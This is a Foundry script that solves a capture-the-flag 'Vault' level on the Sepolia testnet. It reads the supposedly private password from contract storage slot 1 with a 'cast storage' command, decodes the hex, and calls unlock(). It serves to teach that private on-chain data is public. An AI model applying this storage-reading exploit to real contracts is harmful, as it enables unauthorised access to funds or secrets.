// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Vault} from "../src/Vault.sol";

// Our Instance address: https://sepolia.etherscan.io/address/0xdda63de783a4d02bae716d1184b0a0f38db88fc6

contract VaultSolution is Script {
    // $ source .env      # This is to store the environmental variables in the shell session
    // $ forge script script/Vault.s.sol --tc VaultSolution --rpc-url $SEPOLIA_RPC_URL --broadcast --verify -vvvv

    Vault vaultInstance = Vault(0xdda63de783A4D02BaE716D1184b0a0F38Db88FC6);

    function run() external {
        // Deploy Telephone contract (It is better to deploy your instance for the contract to avoid errors)
        if (address(vaultInstance) == address(0)) {
            vaultInstance = _deployVaultContract();
        }
        // We will simulate the attack by the second address, whici is in the .env file
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY_2");
        vm.startBroadcast(attackerPrivateKey);

        // - The `Vault` contract has a password that is kept private, we need to know the password in order to unlock the contract
        // - Since the data is private, it seems we cant retreive its value. But since the blockchain is public by its design, we can get the password value
        // - We can read the contract storage slots values, the password lies after the locked variable, so its in the second slot (slot 1), since we are starting with slot 0
        // - In Foundry: We can write `cast storage <YOUR_VAULT_INSTANCE_ADDRESS> 1 --rpc-url $SEPOLIA_RPC_URL`
        // - We will get the password value, but in hex format
        // - You can use any scripting language like javascript or python to decode the hex into string value, and you will get the password value in string
        // - Congratulations, you get the password and you can unlock the contract.
        console.log("Vault Locked:", vaultInstance.locked());
        // $ cast storage <YOUR_VAULT_INSTANCE_ADDRESS> 1 --rpc-url $SEPOLIA_RPC_URL
        // This will return `0x70617373776f7264`, in our password example "password"
        // You can decode the hex into string using any programing language
        // here is how to decode the hex using javascript
        // -------------------------------
        // myPassword = Buffer.from("0x70617373776f7264".slice(2), "hex")
        // myPassword.toString()
        // -------------------------------
        vaultInstance.unlock("password");
        console.log("Vault Locked:", vaultInstance.locked());

        vm.stopBroadcast();
    }

    function _deployVaultContract() internal returns (Vault) {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        Vault vaultInstance = new Vault("password" /* difficult one don't you think :) */);
        console.log("Vault address:", address(vaultInstance));
        vm.stopBroadcast();
        return vaultInstance;
    }
}
